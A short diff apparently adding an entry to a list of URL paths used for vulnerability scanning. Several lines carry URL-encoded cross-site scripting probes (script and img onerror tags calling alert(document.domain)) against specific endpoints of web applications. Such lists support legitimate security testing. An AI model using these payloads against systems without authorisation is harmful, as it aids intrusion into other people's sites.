@@ -674,3 +674,4 @@
 /api/v1/db/auth/password/reset/nuclei%3C%2Fscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E/
 /rss/watch/%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E?token={{rss_token}}
 /Modules.php?modname=Users/Preferences.php&tab=
+/o/blogs-web/blogs/entry_cover_image_caption.jsp?coverImageURL=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
